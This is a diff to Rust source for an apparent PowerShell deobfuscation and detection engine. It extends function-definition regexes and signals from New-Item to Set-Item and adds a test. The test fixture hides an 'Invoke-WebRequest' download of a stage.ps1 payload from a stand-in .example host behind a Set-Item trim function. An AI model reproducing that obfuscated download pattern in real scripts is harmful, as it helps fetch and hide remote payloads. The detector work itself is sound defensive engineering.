@@ -947,36 +947,36 @@ static PS_FUNCTION_DEF_RE: Lazy<Regex> = Lazy::new(|| {
 });
 
 #[allow(clippy::expect_used)]
-static PS_NEW_ITEM_FUNCTION_DEF_RE: Lazy<Regex> = Lazy::new(|| {
-    Regex::new(r#"(?is)\b(?:New-Item|n`?i)\b([^{}]{0,512})\{"#)
-        .expect("ps new-item function def regex")
+static PS_ITEM_FUNCTION_DEF_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(r#"(?is)\b(?:New-Item|n`?i|Set-Item)\b([^{}]{0,512})\{"#)
+        .expect("ps item function def regex")
 });
 
 #[allow(clippy::expect_used)]
-static PS_NEW_ITEM_FUNCTION_PATH_RE: Lazy<Regex> = Lazy::new(|| {
+static PS_ITEM_FUNCTION_PATH_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(r#"(?i)(?:^|[\s,;])(?:-(?:p|path)\s+)?['"]?function:"#)
-        .expect("ps new-item function path regex")
+        .expect("ps item function path regex")
 });
 
 #[allow(clippy::expect_used)]
-static PS_NEW_ITEM_FUNCTION_NAME_RE: Lazy<Regex> = Lazy::new(|| {
+static PS_ITEM_FUNCTION_NAME_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r#"(?i)(?:^|[\s,;])-(?:n|name)\s+['"]?([A-Za-z_][A-Za-z0-9_]*(?:-[A-Za-z0-9_]+)*)['"]?"#,
     )
-    .expect("ps new-item function name regex")
+    .expect("ps item function name regex")
 });
 
 #[allow(clippy::expect_used)]
-static PS_NEW_ITEM_FUNCTION_PATH_NAME_RE: Lazy<Regex> = Lazy::new(|| {
+static PS_ITEM_FUNCTION_PATH_NAME_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r#"(?i)(?:^|[\s,;])(?:-(?:p|path)\s+)?['"]?function:[\\/]+([A-Za-z_][A-Za-z0-9_]*(?:-[A-Za-z0-9_]+)*)['"]?"#,
     )
-    .expect("ps new-item function path-name regex")
+    .expect("ps item function path-name regex")
 });
 
 #[allow(clippy::expect_used)]
-static PS_NEW_ITEM_FUNCTION_VALUE_RE: Lazy<Regex> = Lazy::new(|| {
-    Regex::new(r#"(?i)(?:^|[\s,;])-(?:val|value)\b"#).expect("ps new-item function value regex")
+static PS_ITEM_FUNCTION_VALUE_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(r#"(?i)(?:^|[\s,;])-(?:val|value)\b"#).expect("ps item function value regex")
 });
 
 #[allow(clippy::expect_used)]
@@ -3464,7 +3464,10 @@ fn expand_literal_split_index_extractor_calls(text: &str) -> String {
 }
 
 fn has_literal_extractor_def_signal(lower: &str) -> bool {
-    lower.contains("function ") || lower.contains("new-item") || has_new_item_alias_signal(lower)
+    lower.contains("function ")
+        || lower.contains("new-item")
+        || lower.contains("set-item")
+        || has_new_item_alias_signal(lower)
 }
 
 fn has_new_item_alias_signal(lower: &str) -> bool {
@@ -3520,17 +3523,16 @@ fn literal_substring_extractor_defs(text: &str) -> Vec<(String, String, String)>
             text[block_open + 1..body_end].to_string(),
         ));
     }
-    for caps in PS_NEW_ITEM_FUNCTION_DEF_RE.captures_iter(text) {
+    for caps in PS_ITEM_FUNCTION_DEF_RE.captures_iter(text) {
         let Some(full) = caps.get(0) else { continue };
         let Some(header) = caps.get(1).map(|m| m.as_str()) else {
             continue;
         };
-        if !PS_NEW_ITEM_FUNCTION_PATH_RE.is_match(header)
-            || !PS_NEW_ITEM_FUNCTION_VALUE_RE.is_match(header)
+        if !PS_ITEM_FUNCTION_PATH_RE.is_match(header) || !PS_ITEM_FUNCTION_VALUE_RE.is_match(header)
         {
             continue;
         }
-        let Some(name) = new_item_function_name(header) else {
+        let Some(name) = item_function_name(header) else {
             continue;
         };
         let block_open = full.end().saturating_sub(1);
@@ -3546,12 +3548,12 @@ fn literal_substring_extractor_defs(text: &str) -> Vec<(String, String, String)>
     defs
 }
 
-fn new_item_function_name(header: &str) -> Option<&str> {
-    PS_NEW_ITEM_FUNCTION_NAME_RE
+fn item_function_name(header: &str) -> Option<&str> {
+    PS_ITEM_FUNCTION_NAME_RE
         .captures(header)
         .and_then(|caps| caps.get(1).map(|m| m.as_str()))
         .or_else(|| {
-            PS_NEW_ITEM_FUNCTION_PATH_NAME_RE
+            PS_ITEM_FUNCTION_PATH_NAME_RE
                 .captures(header)
                 .and_then(|caps| caps.get(1).map(|m| m.as_str()))
         })
@@ -5041,6 +5043,7 @@ impl PsObfuscationSignals {
             || lower.contains("-name ")
             || lower.contains("-n ")
             || lower.contains("new-item")
+            || lower.contains("set-item")
             || has_new_item_alias_signal(&lower);
         let invoke_wrapper = has_function_def && lower.contains("invoke-expression");
         let dot_replace = lower.contains(".replace");
@@ -7333,6 +7336,24 @@ Clean '~~~Invoke-WebRequest -Uri https://ps-ni-path-function-extractor.example/s
                 "'Invoke-WebRequest -Uri https://ps-ni-path-function-extractor.example/stage.ps1'"
             ),
             "New-Item alias function path-name trim extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_set_item_function_path_name_trim_extractor_call_is_rewritten() {
+        let text = r#"(Set-Item Function:\Clean -Value {
+  param($value,$chars)
+  return $value.Trim($chars)
+});
+Clean '~~~Invoke-WebRequest -Uri https://ps-set-item-path-function-extractor.example/stage.ps1~~~' '~'"#;
+
+        let out = expand_literal_trim_extractor_calls(text);
+
+        assert!(
+            out.contains(
+                "'Invoke-WebRequest -Uri https://ps-set-item-path-function-extractor.example/stage.ps1'"
+            ),
+            "Set-Item function path-name trim extractor call was not rewritten:\n{out}"
         );
     }
 
